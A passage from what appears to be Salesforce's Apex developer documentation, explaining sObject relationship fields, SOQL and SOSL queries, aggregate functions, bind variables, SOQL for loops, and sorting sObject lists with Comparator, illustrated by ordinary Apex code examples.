Fields in records returned by SOSL queries must always be dereferenced. Also note that sObject fields that contain formulas return the value of the field at the time the SOQL or SOSL query was issued. Any changes to other fields that are used within the formula are not reflected in the formula field value until the record has been saved and re-queried in Apex. Like other read-only sObject fields, the values of the formula fields themselves cannot be changed in Apex.

#### Accessing sObject Fields Through Relationships

sObject records represent relationships to other records with two fields: an ID and an address that points to a representation of the associated sObject. For example, the Contact sObject has both an `AccountId` field of type ID, and an `Account` field of type Account that points to the associated sObject record itself. The ID field can be used to change the account with which the contact is associated, while the sObject reference field can be used to access data from the account. The reference field is only populated as the result of a SOQL or SOSL query (see note). For example, the following Apex code shows how an account and a contact can be associated with one another, and then how the contact can be used to modify a field on the account: To provide the most complete example, this code uses some elements that are described later in this guide: For information on `insert` and `update` , see Insert Statement and Update Statement .

```apex
Account a = new Account(Name = 'Acme');
insert a;
// Inserting the record automatically assigns a
// value to its ID field
Contact c = new Contact(LastName = 'Weissman');
c.AccountId = a.Id;
// The new contact now points at the new account
insert c;
```

```apex
// A SOQL query accesses data for the inserted contact,
// including a populated c.account field
c = [SELECT Account.Name FROM Contact WHERE Id = :c.Id];
```

```apex
// Now fields in both records can be changed through the contact
c.Account.Name = 'salesforce.com';
c.LastName = 'Roth';
```

```apex
// To update the database, the two types of records must be
```

```apex
// updated separately
update c;
// This only changes the contact's last name
update c.Account; // This updates the account name
```

The expression `c.Account.Name` , and any other expression that traverses a relationship, displays slightly different characteristics when it is read as a value than when it is modified: When being read as a value, if `c.Account` is null, then `c.Account.Name` evaluates to `null` , but does not yield a `NullPointerException` . This design allows developers to navigate multiple relationships without the tedium of having to check for null values. When being modified, if `c.Account` is null, then `c.Account.Name` does yield a `NullPointerException` . In SOSL, you would access data for the inserted contact in a similar way to the SELECT statement used in the previous SOQL example.

```apex
List<List<SObject>> searchList = [FIND 'Acme' IN ALL FIELDS RETURNING
Contact(id,Account.Name)]
```

In addition, the sObject field key can be used with `insert` , `update` , or `upsert` to resolve foreign keys by external ID. For example:

```apex
Account refAcct = new Account(externalId__c = '12345');
```

```apex
Contact c = new Contact(Account = refAcct, LastName = 'Kay');
```

```apex
insert c;
```

This inserts a new contact with the `AccountId` equal to the account with the `external_id` equal to ‘12345’. If there is no such account, the insert fails. The following code is equivalent to the code above. However, because it uses a SOQL query, it is not as efficient. If this code was called multiple times, it could reach the execution limit for the maximum number of SOQL queries. For more information on execution limits, see Execution Governors and Limits on page 348.

```apex
Account refAcct = [SELECT Id FROM Account WHERE externalId__c='12345'];
```

```apex
Contact c = new Contact(Account = refAcct.Id);
```

```apex
insert c;
```

#### Understanding Foreign Key and Parent-Child Relationship SOQL Queries

The `SELECT` statement of a SOQL query can be any valid SOQL statement, including foreign key and parent-child record joins. If foreign key joins are included, the resulting sObjects can be referenced using normal field notation. For example:

```apex
System.debug([SELECT Account.Name FROM Contact
WHERE FirstName = 'Caroline'].Account.Name);
```

Additionally, parent-child relationships in sObjects act as SOQL queries as well. For example:

```apex
for (Account a : [SELECT Id, Name, (SELECT LastName FROM Contacts)
FROM Account
WHERE Name = 'Acme']) {
Contact[] cons = a.Contacts;
}
```

```apex
//The following example also works because we limit to only 1 contact
```

```apex
for (Account a : [SELECT Id, Name, (SELECT LastName FROM Contacts LIMIT 1)
FROM Account
WHERE Name = 'testAgg']) {
Contact c = a.Contacts;
}
```

#### Working with SOQL Aggregate Functions

Aggregate functions in SOQL, such as `SUM()` and `MAX()` , allow you to roll up and summarize your data in a query. For more information on aggregate functions, see Aggregate Functions in the Salesforce SOQL and SOSL Reference Guide . You can use aggregate functions without using a `GROUP` `BY` clause. For example, you could use the `AVG()` aggregate function to find the average `Amount` for all your opportunities.

```apex
AggregateResult[] groupedResults
= [SELECT AVG(Amount)aver FROM Opportunity];
Object avgAmount = groupedResults[0].get('aver');
```

Note that any query that includes an aggregate function returns its results in an array of AggregateResult objects. AggregateResult is a read-only sObject and is only used for query results. Aggregate functions become a more powerful tool to generate reports when you use them with a `GROUP` `BY` clause. For example, you could find the average `Amount` for all your opportunities by campaign.

```apex
AggregateResult[] groupedResults
= [SELECT CampaignId, AVG(Amount)
FROM Opportunity
GROUP BY CampaignId];
for (AggregateResult ar : groupedResults)
{
System.debug('Campaign ID' + ar.get('CampaignId'));
System.debug('Average amount' + ar.get('expr0'));
}
```

Any aggregated field in a `SELECT` list that does not have an alias automatically gets an implied alias with a format `expr` `i` , where `i` denotes the order of the aggregated fields with no explicit aliases. The value of `i` starts at 0 and increments for every aggregated field with no explicit alias. For more information, see Using Aliases with `GROUP` `BY` in the Salesforce SOQL and SOSL Reference Guide . Queries that include aggregate functions are still subject to the limit on total number of query rows. All aggregate functions other than `COUNT()` or `COUNT(fieldname)` include each row used by the aggregation as a query row for the purposes of limit tracking. For `COUNT()` or `COUNT(fieldname)` queries, limits are counted as one query row, unless the query contains a GROUP BY clause, in which case one query row per grouping is consumed. For information about the limits that apply to queries with `for` loop, see SOQL For Loops on page 181.

#### Working with Very Large SOQL Queries

Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain terms to avoid any effect on customer implementations. Your SOQL query sometimes returns so many sObjects that the limit on heap size is exceeded and an error occurs. To resolve, use a SOQL query `for` loop instead, since it can process multiple batches of records by using internal calls to `query` and `queryMore` . For example, if the results are too large, this syntax causes a runtime exception:

```apex
Account[] accts = [SELECT Id FROM Account];
```

Instead, use a SOQL query `for` loop as in one of the following examples:

```apex
// Use this format if you are not executing DML statements
// within the for loop
for (Account a : [SELECT Id, Name FROM Account
WHERE Name LIKE 'Acme%']) {
// Your code without DML statements here
}
```

```apex
// Use this format for efficiency if you are executing DML statements
// within the for loop
for (List<Account> accts : [SELECT Id, Name FROM Account
WHERE Name LIKE 'Acme%']) {
for (Account a : accts) {
// Your code here
}
update accts;
}
```

Using the SOQL query within the `for` loop reduces the possibility of reaching the limit on heap size. However, this approach can result in more CPU cycles being used with increased DML calls. For more information, see SOQL For Loops Versus Standard SOQL Queries . The following example demonstrates a SOQL query `for` loop that’s used to mass update records. Suppose that you want to change the last name of a contact in records for contacts whose first and last names match specified criteria:

```apex
public void massUpdate() {
```

```apex
for (List<Contact> contacts:
[SELECT FirstName, LastName FROM Contact]) {
```

```apex
for(Contact c : contacts) {
```

```apex
if (c.FirstName == 'Barbara' &&
c.LastName == 'Gordon') {
c.LastName = 'Wayne';
}
}
update contacts;
}
}
```

Instead of using a SOQL query in a `for` loop, the preferred method of mass updating records is to use batch Apex , which minimizes the risk of hitting governor limits. For more information, see SOQL For Loops on page 181. For best performance, SOQL queries must be selective, particularly for queries inside triggers. **Selective SOQL Query Criteria** A query is selective when one of the query filters is on an indexed field and the query filter reduces the resulting number of rows below a system-defined threshold. The performance of the SOQL query improves when two or more filters used in the WHERE clause meet the mentioned conditions. As a best practice, a query is considered selective when a query filter on an indexed field matches less than 10% of the total rows. **Custom Index Considerations for Selective SOQL Queries** The following fields are indexed by default. Primary keys (Id, Name, and OwnerId fields) Foreign keys (lookup or master-detail relationship fields) Audit dates (CreatedDate and SystemModstamp fields) RecordType fields (indexed for all standard objects that feature them) Custom fields that are marked as External ID or Unique Fields not indexed by default are automatically indexed when the Salesforce optimizer recognizes that an index can improve performance for frequently run queries. Salesforce Support can add custom indexes on request for customers. A custom index can't be created on these types of fields: multi-select picklists, currency fields in a multicurrency organization, long text fields, some formula fields, and binary fields (fields of type blob, file, or encrypted text.) New data types, typically complex ones, are periodically added to Salesforce, and fields of these types don’t always allow custom indexing. You can’t create custom indexes on formula fields that include invocations of the `TEXT` function on picklist fields. Typically, a custom index isn’t used in these cases. The queried values exceed the system-defined threshold. The filter operator is a negative operator such as `NOT` `EQUAL` `TO` (or `!=` ), `NOT` `CONTAINS` , and `NOT` `STARTS` `WITH` . The `CONTAINS` operator is used in the filter, and the number of rows to be scanned exceeds 333,333. The `CONTAINS` operator requires a full scan of the index. This threshold is subject to change. You’re comparing with an empty value ( `Name` `!=` `''` ). However, there are other complex scenarios in which custom indexes can’t be used. Contact your Salesforce representative if your scenario isn't covered by these cases or if you need further assistance with non-selective queries. **Examples of Selective SOQL Queries** To better understand whether a query on a large object is selective or not, let's analyze some queries. For these queries, assume that there are more than 1 million records for the Account sObject. These records include soft-deleted records, that is, deleted records that are still in the Recycle Bin. Query 1:

```apex
SELECT Id FROM Account WHERE Id IN (<list of account IDs>)
```

The `WHERE` clause is on an indexed field (Id). If `SELECT` `COUNT()` `FROM` `Account` `WHERE` `Id` `IN` `(<list` `of` `account` `IDs>)` returns fewer records than the selectivity threshold, the index on `Id` is used. This index is typically used when the list of IDs contains only a few records. Query 2:

```apex
SELECT Id FROM Account WHERE Name != ''
```

Since Account is a large object even though Name is indexed (primary key), this filter returns most of the records, making the query non-selective. Query 3:

```apex
SELECT Id FROM Account WHERE Name != '' AND CustomField__c = 'ValueA'
```

Here we have to see if any filter, when considered individually, is selective. As we saw in the previous example, the first filter isn't selective. So let's focus on the second one. If the count of records returned by `SELECT` `COUNT()` `FROM` `Account` `WHERE` `CustomField__c` `=` `'ValueA'` is lower than the selectivity threshold, and CustomField__c is indexed, the query is selective.

#### Using SOQL Queries That Return One Record

SOQL queries can be used to assign a single sObject value when the result list contains only one element. When the L-value of an expression is a single sObject type, Apex automatically assigns the single sObject record in the query result list to the L-value. A runtime exception results if zero sObjects or more than one sObject is found in the list. For example:

```apex
List<Account> accts = [SELECT Id FROM Account];
```

```apex
// These lines of code are only valid if one row is returned from
// the query. Notice that the second line dereferences the field from the
// query without assigning it to an intermediary sObject variable.
Account acct = [SELECT Id FROM Account];
String name = [SELECT Name FROM Account].Name;
```

This usage is supported with the following Apex types, methods, or operators: `Database.query` method. Safe Navigation Operator. See Safe Navigation Operator . Null Coalescing Operator. See Null Coalescing Operator . `Map.values` . Although currently supported, Salesforce recommends against using this feature with `Map.values` .

#### Improve Performance by Avoiding Null Values

In your SOQL and SOSL queries, explicitly filtering out null values in the WHERE clause allows Salesforce to improve query performance. In the following example, any records where the `Thread__c` value is null are eliminated from the search.

```apex
Public class TagWS {
```

```apex
/* getThreadTags
*
* a quick method to pull tags not in the existing list
*
*/
public static webservice List<String>
getThreadTags(String threadId, List<String> tags) {
```

```apex
system.debug(LoggingLevel.Debug,tags);
```

```apex
List<String> retVals = new List<String>();
Set<String> tagSet = new Set<String>();
Set<String> origTagSet = new Set<String>();
origTagSet.addAll(tags);
```

```apex
// Note WHERE clause optimizes search where Thread__c is not null
```

```apex
for(CSO_CaseThread_Tag__c t :
```

```apex
[SELECT Name FROM CSO_CaseThread_Tag__c
WHERE Thread__c = :threadId AND
Thread__c != null])
```

```apex
{
tagSet.add(t.Name);
}
for(String x : origTagSet) {
// return a minus version of it so the UI knows to clear it
```

```apex
if(!tagSet.contains(x)) retVals.add('-' + x);
}
for(String x : tagSet) {
// return a plus version so the UI knows it's new
```

```apex
if(!origTagSet.contains(x)) retvals.add('+' + x);
}
```

```apex
return retVals;
}
}
```

#### Working with Polymorphic Relationships in SOQL Queries

A polymorphic relationship is a relationship between objects where a referenced object can be one of several different types. For example, the `Who` relationship field of a Task can be a Contact or a Lead. The following describes how to use SOQL queries with polymorphic relationships in Apex. If you want more general information on polymorphic relationships, see Understanding Relationship Fields and Polymorphic Fields in the SOQL and SOSL Reference. You can use SOQL queries that reference polymorphic fields in Apex to get results that depend on the object type referenced by the polymorphic field. One approach is to filter your results using the `Type` qualifier. This example queries Events that are related to an Account or Opportunity via the What field.

```apex
List<Event> events = [SELECT Description FROM Event WHERE What.Type IN ('Account',
'Opportunity')];
```

Another approach would be to use the `TYPEOF` clause in the SOQL `SELECT` statement. This example also queries Events that are related to an Account or Opportunity via the What field.

```apex
List<Event> events = [SELECT TYPEOF What WHEN Account THEN Phone WHEN Opportunity THEN
Amount END FROM Event];
```

These queries return a list of sObjects where the relationship field references the desired object types. If you need to access the referenced object in a polymorphic relationship, you can use the instanceof keyword to determine the object type. The following example uses `instanceof` to determine whether an Account or Opportunity is related to an Event.

```apex
Event myEvent = eventFromQuery;
if (myEvent.What instanceof Account) {
```

```apex
// myEvent.What references an Account, so process accordingly
} else if (myEvent.What instanceof Opportunity) {
```

```apex
// myEvent.What references an Opportunity, so process accordingly
}
```

Note that you must assign the referenced sObject that the query returns to a variable of the appropriate type before you can pass it to another method. The following example **1.** Queries for User or Group owners of Merchandise__c custom objects using a SOQL query with a `TYPEOF` clause **2.** Uses `instanceof` to determine the owner type **3.** Assigns the owner objects to User or Group type variables before passing them to utility methods

```apex
public class PolymorphismExampleClass {
```

```apex
// Utility method for a User
public static void processUser(User theUser) {
System.debug('Processed User');
}
```

```apex
// Utility method for a Group
public static void processGroup(Group theGroup) {
System.debug('Processed Group');
}
```

```apex
public static void processOwnersOfMerchandise() {
// Select records based on the Owner polymorphic relationship field
List<Merchandise__c> merchandiseList = [SELECT TYPEOF Owner WHEN User THEN LastName
WHEN Group THEN Email END FROM Merchandise__c];
// We now have a list of Merchandise__c records owned by either a User or Group
for (Merchandise__c merch: merchandiseList) {
// We can use instanceof to check the polymorphic relationship type
// Note that we have to assign the polymorphic reference to the appropriate
// sObject type before passing to a method
if (merch.Owner instanceof User) {
User userOwner = merch.Owner;
processUser(userOwner);
} else if (merch.Owner instanceof Group) {
Group groupOwner = merch.Owner;
processGroup(groupOwner);
}
}
}
}
```

#### Using Apex Variables in SOQL and SOSL Queries

SOQL and SOSL statements in Apex can reference Apex code variables and expressions if they’re preceded by a colon ( `:` ). This use of a local code variable within a SOQL or SOSL statement is called a bind . The Apex parser first evaluates the local variable in code context before executing the SOQL or SOSL statement. Bind expressions can be used as: The search string in `FIND` clauses. The filter literals in `WHERE` clauses. The value of the `IN` or `NOT` `IN` operator in `WHERE` clauses, allowing filtering on a dynamic set of values. Note that this is of particular use with a list of IDs or Strings, though it works with lists of any type. The division names in `WITH` `DIVISION` clauses. The numeric value in `LIMIT` clauses. The numeric value in `OFFSET` clauses. For example:

```apex
Account A = new Account(Name='xxx');
insert A;
```

```apex
Account B;
```

```apex
// A simple bind
B = [SELECT Id FROM Account WHERE Id = :A.Id];
```

```apex
// A bind with arithmetic
B = [SELECT Id FROM Account
WHERE Name = :('x' + 'xx')];
```

```apex
String s = 'XXX';
```

```apex
// A bind with expressions
B = [SELECT Id FROM Account
WHERE Name = :'XXXX'.substring(0,3)];
```

```apex
// A bind with INCLUDES clause
B = [SELECT Id FROM Account WHERE :A.TYPE INCLUDES (‘Customer – Direct; Customer –
Channel’)];
```

```apex
// A bind with an expression that is itself a query result
B = [SELECT Id FROM Account
WHERE Name = :[SELECT Name FROM Account
WHERE Id = :A.Id].Name];
```

```apex
Contact C = new Contact(LastName='xxx', AccountId=A.Id);
insert new Contact[]{C, new Contact(LastName='yyy',
accountId=A.id)};
```

```apex
// Binds in both the parent and aggregate queries
B = [SELECT Id, (SELECT Id FROM Contacts
WHERE Id = :C.Id)
FROM Account
WHERE Id = :A.Id];
```

```apex
// One contact returned
Contact D = B.Contacts;
```

```apex
// A limit bind
Integer i = 1;
B = [SELECT Id FROM Account LIMIT :i];
```

```apex
// An OFFSET bind
Integer offsetVal = 10;
List<Account> offsetList = [SELECT Id FROM Account OFFSET :offsetVal];
```

```apex
// An IN-bind with an Id list. Note that a list of sObjects
// can also be used--the Ids of the objects are used for
// the bind
Contact[] cc = [SELECT Id FROM Contact LIMIT 2];
Task[] tt = [SELECT Id FROM Task WHERE WhoId IN :cc];
```

```apex
// An IN-bind with a String list
String[] ss = new String[]{'a', 'b'};
Account[] aa = [SELECT Id FROM Account
```

```apex
WHERE AccountNumber IN :ss];
```

```apex
// A SOSL query with binds in all possible clauses
```

```apex
String myString1 = 'aaa';
String myString2 = 'bbb';
Integer myInt3 = 11;
String myString4 = 'ccc';
Integer myInt5 = 22;
```

```apex
List<List<SObject>> searchList = [FIND :myString1 IN ALL FIELDS
RETURNING
Account (Id, Name WHERE Name LIKE :myString2
LIMIT :myInt3),
Contact,
Opportunity,
Lead
WITH DIVISION =:myString4
LIMIT :myInt5];
```

Apex bind variables aren’t supported for the units parameter in the `DISTANCE` function. This query doesn’t work.

```apex
String units = 'mi';
```

```apex
List<Account> accountList =
```

```apex
[SELECT ID, Name, BillingLatitude, BillingLongitude
```

```apex
FROM Account
```

```apex
WHERE DISTANCE(My_Location_Field__c, GEOLOCATION(10,10), :units) < 10];
```

#### Querying All Records with a SOQL Statement

SOQL statements can use the `ALL` `ROWS` keywords to query all records in an organization, including deleted records and archived activities. For example:

```apex
System.assertEquals(2, [SELECT COUNT() FROM Contact WHERE AccountId = a.Id ALL ROWS]);
```

You can use `ALL` `ROWS` to query records in your organization's Recycle Bin. You cannot use the `ALL` `ROWS` keywords with the `FOR` `UPDATE` keywords.

### SOQL For Loops

SOQL `for` loops iterate over all of the sObject records returned by a SOQL query. The syntax of a SOQL `for` loop is either:

```apex
for (variable : [soql_query]) {
code_block
}
```

or

```apex
for (variable_list : [soql_query]) {
code_block
}
```

Both `variable` and `variable_list` must be of the same type as the sObjects that are returned by the `soql_query` . As in standard SOQL queries, the `[` `soql_query` `]` statement can refer to code expressions in their `WHERE` clauses using the `:` syntax. For example:

```apex
String s = 'Acme';
for (Account a : [SELECT Id, Name from Account
where Name LIKE :(s+'%')]) {
// Your code
}
```

The following example combines creating a list from a SOQL query, with the DML `update` method.

```apex
// Create a list of account records from a SOQL query
List<Account> accs = [SELECT Id, Name FROM Account WHERE Name = 'Siebel'];
```

```apex
// Loop through the list and update the Name field
for(Account a : accs){
a.Name = 'Oracle';
}
```

```apex
// Update the database
update accs;
```

#### SOQL For Loops Versus Standard SOQL Queries

SOQL `for` loops differ from standard SOQL statements because of the method they use to retrieve sObjects. While the standard queries discussed in SOQL and SOSL Queries can retrieve either the `count` of a query or a number of object records, SOQL `for` loops retrieve all sObjects, using efficient chunking with calls to the `query` and `queryMore` methods of SOAP API. Developers can avoid the limit on heap size by using a SOQL `for` loop to process query results that return multiple records. However, this approach can result in more CPU cycles being used. See Total heap size . Queries including an aggregate function don't support `queryMore` . A run-time exception occurs if you use a query containing an aggregate function that returns more than 2,000 rows in a `for` loop. For fine-grained control over the results of a SOQL query, consider using Apex cursors. See Apex Cursors .

#### SOQL For Loop Formats

SOQL `for` loops can process records one at a time using a single sObject variable, or in batches of 200 sObjects at a time using an sObject list: The single sObject format executes the `for` loop's `<code_block>` one time per sObject record. Consequently, it’s easy to understand and use, but is grossly inefficient if you want to use data manipulation language (DML) statements within the `for` loop body. Each DML statement ends up processing only one sObject at a time. The sObject list format executes the `for` loop's `<code_block>` one time per list of 200 sObjects. Consequently, it’s a little more difficult to understand and use, but is the optimal choice if you must use DML statements within the `for` loop body. Each DML statement can bulk process a list of sObjects at a time. For example, the following code illustrates the difference between the two types of SOQL query `for` loops:

```apex
// Create a savepoint because the data should not be committed to the database
Savepoint sp = Database.setSavepoint();
```

```apex
insert new Account[]{new Account(Name = 'yyy'),
```

```apex
new Account(Name = 'yyy'),
```

```apex
new Account(Name = 'yyy')};
```

```apex
// The single sObject format executes the for loop once per returned record
Integer i = 0;
for (Account tmp : [SELECT Id FROM Account WHERE Name = 'yyy']) {
i++;
}
System.assert(i == 3); // Since there were three accounts named 'yyy' in the
// database, the loop executed three times
```

```apex
// The sObject list format executes the for loop once per returned batch
// of records
i = 0;
Integer j;
for (Account[] tmp : [SELECT Id FROM Account WHERE Name = 'yyy']) {
j = tmp.size();
i++;
}
System.assert(j == 3); // The lt should have contained the three accounts
// named 'yyy'
System.assert(i == 1); // Since a single batch can hold up to 200 records and,
// only three records should have been returned, the
// loop should have executed only once
```

```apex
// Revert the database to the original state
Database.rollback(sp);
```

The `break` and `continue` keywords can be used in both types of inline query `for` loop formats. When using the sObject list format, `continue` skips to the next list of sObjects. DML statements can only process up to 10,000 records at a time, and sObject list `for` loops process records in batches of 200. Consequently, if you’re inserting, updating, or deleting more than one record per returned record in an sObject list `for` loop, it’s possible to encounter runtime limit’s errors. See Execution Governors and Limits. You may get a `QueryException` in a SOQL `for` loop with the message `Aggregate` `query` `has` `too` `many` `rows` `for` `direct` `assignment,` `use` `FOR` `loop` . This exception is sometimes thrown when accessing a large set of child records (200 or more) of a retrieved sObject inside the loop, or when getting the size of such a record set. For example, the query in the following SOQL `for` loop retrieves child contacts for a particular account. If this account contains more than 200 child contacts, the statements in the `for` loop cause an exception.

```apex
for (Account acct : [SELECT Id, Name, (SELECT Id, Name FROM Contacts)
FROM Account WHERE Id IN ('<ID value>')]) {
List<Contact> contactList = acct.Contacts; // Causes an error
Integer count = acct.Contacts.size(); // Causes an error
// Note: If JSON.serialize() is used here on acct, the resulting JSON won't have
the complete set of Contacts
}
```

To avoid getting this exception, use a `for` loop to iterate over the child records, as follows.

```apex
for (Account acct : [SELECT Id, Name, (SELECT Id, Name FROM Contacts)
FROM Account WHERE Id IN ('<ID value>')]) {
Integer count=0;
for (Contact c : acct.Contacts) {
```

```apex
count++;
}
}
```

In this example, if `JSON.serialize()` is used on `acct` , only the records that have been retrieved so far will be returned and serialized. Because the Apex SOQL for-loop mechanism is designed to minimize the amount of heap usage by keeping only a subset of the record data in memory, the complete sObject and any subquery sObjects will not be available to obtain complete serialization.

### sObject Collections

You can manage sObjects in lists, sets, and maps. Lists of sObjects Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data. Sorting Lists of sObjects Using the `List.sort` method, you can sort lists of sObjects. Expanding sObject and List Expressions Sets of Objects Sets can contain sObjects among other types of elements. Maps of sObjects Map keys and values can be of any data type, including sObject types, such as Account.

#### Lists of sObjects

Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data. You can use a list to store sObjects. Lists are useful when working with SOQL queries. SOQL queries return sObject data and this data can be stored in a list of sObjects. Also, you can use lists to perform bulk operations, such as inserting a list of sObjects with one call. To declare a list of sObjects, use the `List` keyword followed by the sObject type within <> characters. For example:

```apex
// Create an empty list of Accounts
List<Account> myList = new List<Account>();
```

You can assign a List variable directly to the results of a SOQL query. The SOQL query returns a new list populated with the records returned. Make sure that the declared List variable contains the same sObject that is being queried. Or you can use the generic sObject data type. This example shows how to declare and assign a list of accounts to the return value of a SOQL query. The query returns up to 1,000 returns account records containing the Id and Name fields.

```apex
// Create a list of account records from a SOQL query
List<Account> accts = [SELECT Id, Name FROM Account LIMIT 1000];
```

As with lists of primitive data types, you can access and set elements of sObject lists using the `List` methods provided by Apex. For example:

```apex
List<Account> myList = new List<Account>(); // Define a new list
Account a = new Account(Name='Acme'); // Create the account first
myList.add(a);
// Add the account sObject
Account a2 = myList.get(0);
// Retrieve the element at index 0
```

You can bulk-process a list of sObjects by passing a list to the DML operation. This example shows how you can insert a list of accounts.

```apex
// Define the list
List<Account> acctList = new List<Account>();
// Create account sObjects
Account a1 = new Account(Name='Account1');
Account a2 = new Account(Name='Account2');
// Add accounts to the list
acctList.add(a1);
acctList.add(a2);
// Bulk insert the list
insert acctList;
```

If you perform a bulk insert of Knowledge article versions, make the ownerId of all records the same. Apex automatically generates IDs for each object in an sObject list that was inserted or upserted using DML. Therefore, a list that contains more than one instance of an sObject cannot be inserted or upserted even if it has a `null` ID. This situation would imply that two IDs would need to be written to the same structure in memory, which is illegal. For example, the `insert` statement in the following block of code generates a `ListException` because it tries to insert a list with two references to the same sObject ( `a` ):

```apex
try {
```

```apex
// Create a list with two references to the same sObject element
Account a = new Account();
List<Account> accs = new List<Account>{a, a};
```

```apex
// Attempt to insert it...
insert accs;
```

```apex
// Will not get here
System.assert(false);
} catch (ListException e) {
```

```apex
// But will get here
}
```

Alternatively, you can use the array notation (square brackets) to declare and reference lists of sObjects. This example declares a list of accounts using the array notation.

```apex
Account[] accts = new Account[1];
```

This example adds an element to the list using square brackets.

```apex
accts[0] = new Account(Name='Acme2');
```

These examples also use the array notation with sObject lists. Defines an Account list with no elements. `List<Account>` `accts` `=` `new` `Account[]{};` Defines an Account list with memory allocated for three Accounts: a new Account object in the first position, `null` in the second, and another new Account object in the third.

```apex
List<Account> accts = new Account[]
{new Account(), null, new
Account()};
```

Defines the Contact list with a new list. `List<Contact>` `contacts` `=` `new` `List<Contact>`

```apex
(otherList);
```

#### Sorting Lists of sObjects

Using the `List.sort` method, you can sort lists of sObjects. For sObjects, sorting is in ascending order and uses a sequence of comparison steps outlined in the next section. You can create a custom sort order for sObjects by wrapping your sObject in an Apex class that implements the `Comparable` interface. You can also create a custom sort order by passing a class that implements `Comparator` as a parameter to the sort method. See Custom Sort Order of sObjects . The `List.sort` method sorts sObjects in ascending order and compares sObjects using an ordered sequence of steps that specify the labels or fields used. The comparison starts with the first step in the sequence and ends when two sObjects are sorted using specified labels or fields. The following is the comparison sequence used: **1.** The label of the sObject type. For example, an Account sObject appears before a Contact. **2.** The Name field, if applicable. For example, if the list contains two accounts named Alpha and Beta, account Alpha comes before account Beta. **3.** Standard fields, starting with the fields that come first in alphabetical order, except for the Id and Name fields. For example, if two accounts have the same name, the first standard field used for sorting is AccountNumber. **4.** Custom fields, starting with the fields that come first in alphabetical order. For example, suppose two accounts have the same name and identical standard fields, and there are two custom fields, FieldA and FieldB, the value of FieldA is used first for sorting. Not all steps in this sequence are necessarily carried out. For example, a list containing two sObjects of the same type and with unique Name values is sorted based on the Name field and sorting stops at step 2. Otherwise, if the names are identical or the sObject doesn’t have a Name field, sorting proceeds to step 3 to sort by standard fields. For text fields, the sort algorithm uses the Unicode sort order. Also, empty fields precede non-empty fields in the sort order. Here’s an example of sorting a list of Account sObjects. This example shows how the Name field is used to place the Acme account ahead of the two sForce accounts in the list. Since there are two accounts named sForce, the Industry field is used to sort these remaining accounts because the Industry field comes before the Site field in alphabetical order.

```apex
Account[] acctList = new List<Account>();
acctList.add( new Account(
Name='sForce',
Industry='Biotechnology',
Site='Austin'));
acctList.add(new Account(
Name='sForce',
Industry='Agriculture',
Site='New York'));
acctList.add(new Account(
Name='Acme'));
System.debug(acctList);
```

```apex
acctList.sort();
Assert.areEqual('Acme', acctList[0].Name);
Assert.areEqual('sForce', acctList[1].Name);
Assert.areEqual('Agriculture', acctList[1].Industry);
Assert.areEqual('sForce', acctList[2].Name);
Assert.areEqual('Biotechnology', acctList[2].Industry);
System.debug(acctList);
```

This example is similar to the previous one, except that it uses the Merchandise__c custom object. This example shows how the Name field is used to place the Notebooks merchandise ahead of Pens in the list. Because there are two merchandise sObjects with the Name field value of Pens, the Description field is used to sort these remaining merchandise items. The Description field is used for sorting because it comes before the Price and Total_Inventory fields in alphabetical order.

```apex
Merchandise__c[] merchList = new List<Merchandise__c>();
merchList.add( new Merchandise__c(
Name='Pens',
Description__c='Red pens',
Price__c=2,
Total_Inventory__c=1000));
merchList.add( new Merchandise__c(
Name='Notebooks',
Description__c='Cool notebooks',
Price__c=3.50,
Total_Inventory__c=2000));
merchList.add( new Merchandise__c(
Name='Pens',
Description__c='Blue pens',
Price__c=1.75,
Total_Inventory__c=800));
System.debug(merchList);
```

```apex
merchList.sort();
Assert.areEqual('Notebooks', merchList[0].Name);
```

```apex
Assert.areEqual('Pens', merchList[1].Name);
Assert.areEqual('Blue pens', merchList[1].Description__c);
Assert.areEqual('Pens', merchList[2].Name);
Assert.areEqual('Red pens', merchList[2].Description__c);
System.debug(merchList);
```

To create a custom sort order for sObjects in lists, implement the `Comparator` interface and pass it as a parameter to the `List.sort` method. Alternatively, create a wrapper class for the sObject and implement the `Comparable` interface. The wrapper class contains the sObject in question and implements the `Comparable.compareTo` method in which you specify the sort logic. This example implements the `Comparator` interface to compare two opportunities based on the Amount field.

```apex
public class OpportunityComparator implements Comparator<Opportunity> {
public Integer compare(Opportunity o1, Opportunity o2) {
```

```apex
// The return value of 0 indicates that both elements are equal.
Integer returnValue = 0;
```

```apex
if(o1 == null && o2 == null) {
returnValue = 0;
} else if(o1 == null) {
// nulls-first implementation
returnValue = -1;
} else if(o2 == null) {
// nulls-first implementation
returnValue = 1;
} else if ((o1.Amount == null) && (o2.Amount == null)) {
// both have null Amounts
returnValue = 0;
} else if (o1.Amount == null){
// nulls-first implementation
returnValue = -1;
} else if (o2.Amount == null){
// nulls-first implementation
returnValue = 1;
} else if (o1.Amount < o2.Amount) {
// Set return value to a negative value.
returnValue = -1;
} else if (o1.Amount > o2.Amount) {
// Set return value to a positive value.
returnValue = 1;
}
return returnValue;
}
}
```

This test sorts a list of `Comparator` objects and verifies that the list elements are sorted by the opportunity amount.

```apex
@isTest
private class OpportunityComparator_Test {
```

```apex
@isTest
```

```apex
static void sortViaComparator() {
// Add the opportunity wrapper objects to a list.
List<Opportunity> oppyList = new List<Opportunity>();
Date closeDate = Date.today().addDays(10);
oppyList.add( new Opportunity(
Name='Edge Installation',
CloseDate=closeDate,
StageName='Prospecting',
Amount=50000));
oppyList.add( new Opportunity(
Name='United Oil Installations',
CloseDate=closeDate,
StageName='Needs Analysis',
Amount=100000));
oppyList.add( new Opportunity(
Name='Grand Hotels SLA',
CloseDate=closeDate,
StageName='Prospecting',
Amount=25000));
oppyList.add(null);
```

```apex
// Sort the objects using the Comparator implementation
oppyList.sort(new OpportunityComparator());
// Verify the sort order
Assert.isNull(oppyList[0]);
Assert.areEqual('Grand Hotels SLA', oppyList[1].Name);
Assert.areEqual(25000, oppyList[1].Amount);
Assert.areEqual('Edge Installation', oppyList[2].Name);
Assert.areEqual(50000, oppyList[2].Amount);
Assert.areEqual('United Oil Installations', oppyList[3].Name);
Assert.areEqual(100000, oppyList[3].Amount);
// Write the sorted list contents to the debug log.
System.debug(oppyList);
}
}
```

This example shows how to create a wrapper `Comparable` class for Opportunity. The implementation of the `compareTo` method in this class compares two opportunities based on the Amount field—the class member variable contained in this instance, and the opportunity object passed into the method.

```apex
public class OpportunityWrapper implements Comparable {
```

```apex
public Opportunity oppy;
```

```apex
// Constructor
